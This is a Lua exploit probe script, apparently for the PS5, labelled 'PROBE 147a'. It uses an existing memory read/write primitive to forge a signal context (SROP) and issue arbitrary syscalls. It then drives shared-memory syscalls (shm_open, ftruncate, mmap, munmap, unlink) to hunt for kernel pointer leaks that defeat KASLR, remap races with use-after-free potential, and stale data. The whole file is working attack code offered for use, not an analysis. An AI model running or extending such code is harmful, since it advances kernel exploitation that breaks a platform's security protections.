-- CRASH_CLASS: LOW
-- PROBE 147a: Shared memory exploitation + KASLR side channels
--
-- shm_open(482) works (confirmed 145b). Explore:
-- 1. Multiple shm objects, mmap them, check for kernel metadata leaks
-- 2. shm_open + mmap + munmap + remap race (UAF potential)
-- 3. Use sys 624 (VM op counter) as side channel after shm operations
-- 4. ftruncate on shm fd
-- 5. shm_open with special names
-- 6. mmap shm with various flags (MAP_STACK, etc)

print("=== PROBE 147a: SHM EXPLOIT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)

-- [A] shm_open, ftruncate, mmap, read pages
print("--- [A] SHM BASIC ---")

-- O_CREAT|O_RDWR = 0x0202, mode = 0666 = 0x1B6
-- shm_open = syscall 482
local name = gpu + 0x1000
-- "/test1\0"
wd(name, 0x7365742F) -- "/tes"
wd(name + 4, 0x00003174) -- "t1\0\0"
local name_a = uint64(string.format("0x%X%08X", gh, gl + 0x1000))

local fd = srop(482, name_a, uint64(0x0202), uint64(0x1B6))
local fd_v = fd and to_num(fd) or -999
print("shm_open=" .. fd_v)

if fd_v >= 0 then
    -- ftruncate to 4 pages (64KB on PS5 16KB pages)
    -- ftruncate = syscall 480
    local tr = srop(480, uint64(fd_v), uint64(0x10000))
    print("ftruncate=" .. (tr and tostring(to_num(tr)) or "nil"))

    -- mmap the shm fd
    -- PROT_READ|PROT_WRITE=3, MAP_SHARED=1
    local shm_map = srop(477, uint64(0), uint64(0x10000), uint64(3), uint64(1), uint64(fd_v), uint64(0))
    local smh, sml = get_hi_lo(shm_map)
    print("shm_mmap=0x" .. string.format("%X%08X", smh, sml))

    if smh ~= 0xFFFFFFFF then
        -- Write pattern
        for pg = 0, 3 do
            local ok1 = pcall(function()
                memory.write_dword(shm_map + pg * 0x4000, 0xDEAD0000 + pg)
            end)
            if not ok1 then
                print("  write_fail page=" .. pg)
            end
        end

        -- Read back
        for pg = 0, 3 do
            local ok1, v = pcall(function()
                return memory.read_dword(shm_map + pg * 0x4000)
            end)
            if ok1 then
                print("  pg" .. pg .. "=0x" .. string.format("%08X", to_num(v)))
            end
        end

        -- Scan for kernel pointers in unmapped pages (adjacent memory)
        local kp_count = 0
        for off = 0, 0xFFF0, 8 do
            local ok2, v = pcall(function()
                return memory.read_qword(shm_map + off)
            end)
            if ok2 then
                local h, l = get_hi_lo(v)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    kp_count = kp_count + 1
                    if kp_count <= 5 then
                        print("  *** KPTR +0x" .. string.format("%X", off) .. "=0x" .. string.format("%X%08X", h, l))
                    end
                end
            end
        end
        print("kernel_ptrs=" .. kp_count)

        -- Check VM ops
        local vm1 = srop(624)
        print("vm_ops=" .. (vm1 and tostring(to_num(vm1)) or "nil"))

        -- munmap the shm
        -- munmap = syscall 73
        srop(73, shm_map, uint64(0x10000))
    end

    -- [B] Re-mmap after munmap (reuse the fd)
    print("")
    print("--- [B] RE-MMAP ---")
    local shm2 = srop(477, uint64(0), uint64(0x10000), uint64(3), uint64(1), uint64(fd_v), uint64(0))
    local s2h, s2l = get_hi_lo(shm2)
    print("re_mmap=0x" .. string.format("%X%08X", s2h, s2l))

    if s2h ~= 0xFFFFFFFF then
        -- Check if our pattern survived the munmap/remap
        local ok3, v3 = pcall(function()
            return memory.read_dword(shm2)
        end)
        if ok3 then
            local pg0 = to_num(v3)
            print("pg0_after_remap=0x" .. string.format("%08X", pg0))
            if pg0 == 0xDEAD0000 then
                print("*** DATA PERSISTED ***")
            end
        end

        srop(73, shm2, uint64(0x10000))
    end

    -- [C] Multiple shm objects
    print("")
    print("--- [C] MULTI SHM ---")
    local fds = {}
    for idx = 0, 7 do
        local n = gpu + 0x2000 + idx * 0x10
        wd(n, 0x6D68732F) -- "/shm"
        wd(n + 4, 0x00000030 + idx) -- "0"-"7" + null
        local na = uint64(string.format("0x%X%08X", gh, gl + 0x2000 + idx * 0x10))
        local f = srop(482, na, uint64(0x0202), uint64(0x1B6))
        local fv = f and to_num(f) or -999
        fds[idx] = fv
        if fv >= 0 then
            srop(480, uint64(fv), uint64(0x4000)) -- 1 page each
        end
    end
    print("fds: " .. table.concat({fds[0] or "x", fds[1] or "x", fds[2] or "x", fds[3] or "x", fds[4] or "x", fds[5] or "x", fds[6] or "x", fds[7] or "x"}, ","))

    -- Map all 8 shm objects
    local maps = {}
    for idx = 0, 7 do
        if fds[idx] and fds[idx] >= 0 then
            local m = srop(477, uint64(0), uint64(0x4000), uint64(3), uint64(1), uint64(fds[idx]), uint64(0))
            local mh, ml = get_hi_lo(m)
            maps[idx] = {h=mh, l=ml, addr=m}
            if mh ~= 0xFFFFFFFF then
                -- Write identifier
                pcall(function() memory.write_dword(m, 0x5A000000 + idx) end)
            end
        end
    end

    -- Check adjacency (are shm mappings adjacent?)
    local adj = {}
    for idx = 0, 6 do
        if maps[idx] and maps[idx+1] then
            local gap = maps[idx+1].l - maps[idx].l
            if gap == 0x4000 then
                adj[#adj+1] = idx .. "-" .. (idx+1)
            end
        end
    end
    if #adj > 0 then
        print("adjacent: " .. table.concat(adj, ", "))
    else
        print("no adjacency")
    end

    -- Print map addresses
    for idx = 0, 7 do
        if maps[idx] then
            print("  shm" .. idx .. "=0x" .. string.format("%X%08X", maps[idx].h, maps[idx].l))
        end
    end

    -- VM ops after all shm
    local vm2 = srop(624)
    local vm2v = vm2 and to_num(vm2) or 0
    print("vm_ops_after_shm=" .. vm2v)

    -- Cleanup: munmap all, close all, unlink all
    for idx = 0, 7 do
        if maps[idx] and maps[idx].h ~= 0xFFFFFFFF then
            srop(73, maps[idx].addr, uint64(0x4000))
        end
        if fds[idx] and fds[idx] >= 0 then
            srop(6, uint64(fds[idx])) -- close
        end
    end

    -- [D] shm_unlink + reopen (check for stale data)
    print("")
    print("--- [D] UNLINK + REOPEN ---")
    -- shm_unlink = syscall 483
    local ul = srop(483, name_a)
    print("unlink=" .. (ul and tostring(to_num(ul)) or "nil"))

    -- Reopen same name
    local fd2 = srop(482, name_a, uint64(0x0202), uint64(0x1B6))
    local fd2v = fd2 and to_num(fd2) or -999
    print("reopen=" .. fd2v)

    if fd2v >= 0 then
        srop(480, uint64(fd2v), uint64(0x4000))
        local m2 = srop(477, uint64(0), uint64(0x4000), uint64(3), uint64(1), uint64(fd2v), uint64(0))
        local m2h, m2l = get_hi_lo(m2)
        if m2h ~= 0xFFFFFFFF then
            local ok4, v4 = pcall(function() return memory.read_dword(m2) end)
            print("new_pg0=0x" .. string.format("%08X", ok4 and to_num(v4) or 0))
            srop(73, m2, uint64(0x4000))
        end
        srop(6, uint64(fd2v))
    end

    -- Close original fd
    srop(6, uint64(fd_v))
end

-- [E] MAP_STACK with shm fd
print("")
print("--- [E] MAP_STACK ---")
local n2 = gpu + 0x3000
wd(n2, 0x74732F)
wd(n2 + 4, 0x006B6361)
local n2_a = uint64(string.format("0x%X%08X", gh, gl + 0x3000))

local fd3 = srop(482, n2_a, uint64(0x0202), uint64(0x1B6))
local fd3v = fd3 and to_num(fd3) or -999
if fd3v >= 0 then
    srop(480, uint64(fd3v), uint64(0x10000))
    -- MAP_STACK = 0x400, MAP_SHARED = 1
    local stk = srop(477, uint64(0), uint64(0x10000), uint64(3), uint64(0x401), uint64(fd3v), uint64(0))
    local stkh, stkl = get_hi_lo(stk)
    print("map_stack=0x" .. string.format("%X%08X", stkh, stkl))
    if stkh ~= 0xFFFFFFFF then
        srop(73, stk, uint64(0x10000))
    end

    -- MAP_NOSYNC = 0x800
    local ns = srop(477, uint64(0), uint64(0x10000), uint64(3), uint64(0x801), uint64(fd3v), uint64(0))
    local nsh, nsl = get_hi_lo(ns)
    print("map_nosync=0x" .. string.format("%X%08X", nsh, nsl))
    if nsh ~= 0xFFFFFFFF then
        srop(73, ns, uint64(0x10000))
    end

    srop(6, uint64(fd3v))
    srop(483, n2_a)
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
